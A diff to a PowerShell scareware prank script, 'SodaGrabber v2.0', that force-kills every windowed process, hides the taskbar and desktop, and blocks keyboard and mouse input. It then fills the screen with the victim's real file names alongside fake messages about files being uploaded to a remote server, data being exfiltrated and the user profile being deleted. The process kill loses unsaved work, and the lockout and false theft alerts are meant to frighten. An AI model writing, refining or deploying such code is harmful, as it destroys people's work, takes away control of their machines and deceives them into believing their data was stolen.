@@ -1,7 +1,13 @@
-# Kill everything first
-Get-Process | Where-Object { $_.Name -ne "powershell" -and $_.Name -ne "cmd" } | Stop-Process -Force -ErrorAction SilentlyContinue
+# Kill everything and hide all windows
+Get-Process | Where-Object { 
+    $_.Name -ne "powershell" -and 
+    $_.Name -ne "cmd" -and 
+    $_.Name -ne "conhost" -and
+    $_.Name -ne "Idle" -and
+    $_.MainWindowTitle -ne "" 
+} | Stop-Process -Force -ErrorAction SilentlyContinue
 
-# Block input and other windows
+# Hide taskbar and desktop
 $signature = @'
 [DllImport("user32.dll")]
 public static extern bool BlockInput(bool fBlockIt);
@@ -9,8 +15,18 @@ public static extern bool BlockInput(bool fBlockIt);
 public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll")]
+public static extern bool SetForegroundWindow(IntPtr hWnd);
 '@
 Add-Type -MemberDefinition $signature -Name WindowAPI -Namespace API
+
+# Hide taskbar
+$taskbar = [API.WindowAPI]::FindWindow("Shell_TrayWnd", $null)
+[API.WindowAPI]::ShowWindow($taskbar, 0)
+
+# Hide desktop
+$desktop = [API.WindowAPI]::FindWindow("Progman", $null)
+[API.WindowAPI]::ShowWindow($desktop, 0)
 
 [API.WindowAPI]::BlockInput($true)
 
@@ -31,11 +47,11 @@ $soundPath = "$env:TEMP\scary_sound.mp3"
 
 try {
     Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath -ErrorAction Stop
-    Start-Process $soundPath -WindowStyle Minimized
+    Start-Process $soundPath -WindowStyle Hidden
 } catch {}
 
 $form = New-Object System.Windows.Forms.Form
-$form.Text = "SodaGrabber v2.0 - SYSTEM ACCESS"
+$form.Text = ""
 $form.WindowState = "Maximized"
 $form.FormBorderStyle = "None"
 $form.TopMost = $true
@@ -49,6 +65,10 @@ $form.BackColor = "Black"
 $form.KeyPreview = $true
 $form.Add_KeyDown({
     if ($_.KeyCode -eq "Escape") {
+        $taskbar = [API.WindowAPI]::FindWindow("Shell_TrayWnd", $null)
+        [API.WindowAPI]::ShowWindow($taskbar, 1)
+        $desktop = [API.WindowAPI]::FindWindow("Progman", $null)
+        [API.WindowAPI]::ShowWindow($desktop, 1)
         [API.WindowAPI]::BlockInput($false)
         Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
         $form.Close()
@@ -64,19 +84,22 @@ $label.Text = ""
 $label.AutoSize = $false
 $label.Size = New-Object System.Drawing.Size($form.Width, $form.Height)
 $label.TextAlign = "TopLeft"
-$label.Padding = New-Object System.Windows.Forms.Padding(10, 5, 10, 5)
+$label.Padding = New-Object System.Windows.Forms.Padding(20, 20, 20, 20)
 
 $form.Controls.Add($label)
 $form.Show()
 $form.Refresh()
+[API.WindowAPI]::SetForegroundWindow($form.Handle)
 Start-Sleep -Milliseconds 1350
 
 $username = [Environment]::UserName
 
-$label.Text = "Hello $username!`n`nInitializing SodaGrabber v2.0...`n"
+$displayText = "Hello $username!`r`n`r\nInitializing SodaGrabber v2.0...`r`n"
+$label.Text = $displayText
 $form.Refresh()
 Start-Sleep -Seconds 2
-$label.Text += "Scanning system directories...`n`n"
+$displayText += "Scanning system directories...`r`n`r`n"
+$label.Text = $displayText
 $form.Refresh()
 Start-Sleep -Seconds 1
 
@@ -106,7 +129,7 @@ $allFiles = @()
 foreach ($location in $scanLocations) {
     if (Test-Path $location) {
         try {
-            $files = Get-ChildItem -Path $location -File -ErrorAction SilentlyContinue -Recurse -Force -ErrorAction SilentlyContinue | Select-Object -First 200
+            $files = Get-ChildItem -Path $location -File -ErrorAction SilentlyContinue -Recurse -Force -ErrorAction SilentlyContinue | Select-Object -First 100
             $allFiles += $files
         } catch {}
     }
@@ -115,7 +138,7 @@ foreach ($location in $scanLocations) {
 $allFiles = $allFiles | Where-Object { $_.Name -ne $null } | Sort-Object { Get-Random }
 
 if ($allFiles.Count -eq 0) {
-    for ($i = 1; $i -le 1000; $i++) {
+    for ($i = 1; $i -le 500; $i++) {
         $allFiles += [PSCustomObject]@{
             Name = "system_file_$i.dll"
             FullName = "C:\Windows\System32\system_file_$i.dll"
@@ -126,7 +149,7 @@ if ($allFiles.Count -eq 0) {
 
 $fileIndex = 0
 $totalFiles = $allFiles.Count
-$lastScrollTime = Get-Date
+$lastCleanup = Get-Date
 
 while ((Get-Date) -lt $scanEndTime) {
     $currentFile = $allFiles[$fileIndex % $totalFiles]
@@ -141,93 +164,96 @@ while ((Get-Date) -lt $scanEndTime) {
     
     $foundFiles += $fileName
     
-    $label.Text += "[FOUND] $fileName`n"
-    $label.Text += "[LOCATION] $filePath`n"
-    $label.Text += "[SIZE] $fileSize MB`n"
-    $label.Text += "[DOWNLOADING] $fileName...`n"
+    $displayText += "[FOUND] $fileName`r`n"
+    $displayText += "[LOCATION] $filePath`r`n"
+    $displayText += "[SIZE] $fileSize MB`r`n"
+    $displayText += "[DOWNLOADING] $fileName...`r`n"
     
     $elapsed = ((Get-Date) - $scanStartTime).TotalSeconds
     $percentComplete = [math]::Round(($elapsed / $scanDuration) * 100)
-    $label.Text += "[PROGRESS] $percentComplete% - $fileIndex files found`n`n"
+    $displayText += "[PROGRESS] $percentComplete% - $fileIndex files found`r`n`r`n"
     
-    if ((Get-Date) - $lastScrollTime -gt [TimeSpan]::FromSeconds(2)) {
-        $lines = $label.Text -split "`n"
-        if ($lines.Count -gt 50) {
-            $label.Text = ($lines[-50..-1] -join "`n")
+    if ((Get-Date) - $lastCleanup -gt [TimeSpan]::FromSeconds(3)) {
+        $lines = $displayText -split "`r`n"
+        if ($lines.Count -gt 40) {
+            $displayText = ($lines[-40..-1] -join "`r`n")
         }
-        $lastScrollTime = Get-Date
+        $lastCleanup = Get-Date
     }
     
+    $label.Text = $displayText
     $form.Refresh()
     [System.Windows.Forms.Application]::DoEvents()
+    [API.WindowAPI]::SetForegroundWindow($form.Handle)
     
-    $form.BringToFront()
-    $form.Activate()
-    
-    $delay = Get-Random -Minimum 300 -Maximum 700
+    $delay = Get-Random -Minimum 400 -Maximum 800
     Start-Sleep -Milliseconds $delay
 }
 
-$label.Text += "`n" + "="*60 + "`n"
-$label.Text += "[SCAN COMPLETE] $($foundFiles | Select-Object -Unique | Measure-Object | Select-Object -ExpandProperty Count) unique files located`n"
-$label.Text += "[TRANSFER INITIATED] Connecting to SodaGrabber.xyz...`n"
+$displayText += "`r`n" + "="*60 + "`r`n"
+$displayText += "[SCAN COMPLETE] $($foundFiles | Select-Object -Unique | Measure-Object | Select-Object -ExpandProperty Count) unique files located`r`n"
+$displayText += "[TRANSFER INITIATED] Connecting to SodaGrabber.xyz...`r`n"
+$label.Text = $displayText
 $form.Refresh()
 Start-Sleep -Seconds 3
 
 $foundFiles = $foundFiles | Select-Object -Unique
-$transferStartTime = (Get-Date)
 
 foreach ($file in $foundFiles) {
-    $label.Text += "`n[UPLOADING] $file -> SodaGrabber.xyz`n"
-    $label.Text += "[STATUS] .."
+    $displayText += "`r`n[UPLOADING] $file -> SodaGrabber.xyz`r`n"
+    $displayText += "[STATUS] .."
+    $label.Text = $displayText
     $form.Refresh()
     Start-Sleep -Milliseconds 700
-    $label.Text += " ."
+    $displayText += " ."
+    $label.Text = $displayText
     $form.Refresh()
     Start-Sleep -Milliseconds 700
-    $label.Text += " .`n"
+    $displayText += " .`r`n"
+    $label.Text = $displayText
     $form.Refresh()
     Start-Sleep -Milliseconds 700
-    $label.Text += "[COMPLETED] $file transferred successfully!`n"
+    $displayText += "[COMPLETED] $file transferred successfully!`r`n"
+    $label.Text = $displayText
     $form.Refresh()
     [System.Windows.Forms.Application]::DoEvents()
-    $form.BringToFront()
 }
 
-$label.ForeColor = "Red"
-$label.Font = New-Object System.Drawing.Font("Consolas", 11, [System.Drawing.FontStyle]::Bold)
-$label.Text += "`n" + "!"*70 + "`n"
-$label.Text += "!!! UNAUTHORIZED TRANSFER DETECTED !!!`n"
-$label.Text += "!"*70 + "`n"
+$displayText += "`r`n" + "!"*70 + "`r`n"
+$displayText += "!!! UNAUTHORIZED TRANSFER DETECTED !!!`r`n"
+$displayText += "!"*70 + "`r`n"
+$label.Text = $displayText
 $form.Refresh()
 Start-Sleep -Seconds 2
 
 foreach ($file in $foundFiles) {
-    $label.Text += "`n[ALERT] $file has been Transferred!"
-    $label.Text += "`n[WARNING] Remote server: 198.51.100.$((Get-Random -Minimum 1 -Maximum 255))"
-    $label.Text += "`n[STATUS] Data exfiltrated!`n"
+    $displayText += "`r`n[ALERT] $file has been Transferred!`r`n"
+    $displayText += "[WARNING] Remote server: 198.51.100.$((Get-Random -Minimum 1 -Maximum 255))`r`n"
+    $displayText += "[STATUS] Data exfiltrated!`r`n"
+    $label.Text = $displayText
     $form.Refresh()
     [System.Windows.Forms.Application]::DoEvents()
 }
 
 Start-Sleep -Seconds 2
 
-$label.Text += "`n" + "█"*70 + "`n"
-$label.Text += "██ UHHH U R CRASHING REAL!! ██`n"
-$label.Text += "█"*70 + "`n"
+$displayText += "`r`n" + "█"*70 + "`r`n"
+$displayText += "██ UHHH U R CRASHING REAL!! ██`r`n"
+$displayText += "█"*70 + "`r`n"
+$label.Text = $displayText
 $form.Refresh()
 
 $spamEnd = (Get-Date).AddSeconds(15)
 while ((Get-Date) -lt $spamEnd) {
-    $label.Text += "[CRITICAL] SYSTEM DESTABILIZATION DETECTED - FORCING DESKTOP REDIRECT`n"
-    $label.Text += "[ERROR 0x$("{0:X4}" -f (Get-Random -Maximum 65535))] MEMORY CORRUPTION IN SECTOR $(Get-Random -Minimum 1 -Maximum 999)`n"
-    $label.Text += "[WARNING] $username.exe has stopped responding`n"
-    $label.Text += "[FATAL] Attempting to delete user profile...`n"
+    $displayText += "[CRITICAL] SYSTEM DESTABILIZATION DETECTED - FORCING DESKTOP REDIRECT`r`n"
+    $displayText += "[ERROR 0x$("{0:X4}" -f (Get-Random -Maximum 65535))] MEMORY CORRUPTION IN SECTOR $(Get-Random -Minimum 1 -Maximum 999)`r`n"
+    $displayText += "[WARNING] $username.exe has stopped responding`r`n"
+    $displayText += "[FATAL] Attempting to delete user profile...`r`n"
+    $label.Text = $displayText
     $form.Refresh()
     
     Start-Sleep -Milliseconds 80
     [System.Windows.Forms.Application]::DoEvents()
-    $form.BringToFront()
 }
 
 $shell = New-Object -ComObject "Shell.Application"
@@ -241,17 +267,23 @@ for ($i = 0; $i -lt 15; $i++) {
     [System.Windows.Forms.Application]::DoEvents()
 }
 
-$label.Text += "`n`n" + " "*30 + "SYSTEM TERMINATION IN PROGRESS...`n"
-$label.Text += " "*30 + "Goodbye, $username!`n"
+$displayText += "`r`n`r`n" + " "*30 + "SYSTEM TERMINATION IN PROGRESS...`r`n"
+$displayText += " "*30 + "Goodbye, $username!`r`n"
+$label.Text = $displayText
 $form.Refresh()
 Start-Sleep -Seconds 3
 
+# Restore everything
+$taskbar = [API.WindowAPI]::FindWindow("Shell_TrayWnd", $null)
+[API.WindowAPI]::ShowWindow($taskbar, 1)
+$desktop = [API.WindowAPI]::FindWindow("Progman", $null)
+[API.WindowAPI]::ShowWindow($desktop, 1)
 [API.WindowAPI]::BlockInput($false)
+
 $form.Close()
 [System.Windows.Forms.Application]::Exit()
 
 Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
-Start-Sleep -Seconds 1
 if (Test-Path $soundPath) {
     Remove-Item $soundPath -Force -ErrorAction SilentlyContinue
 }
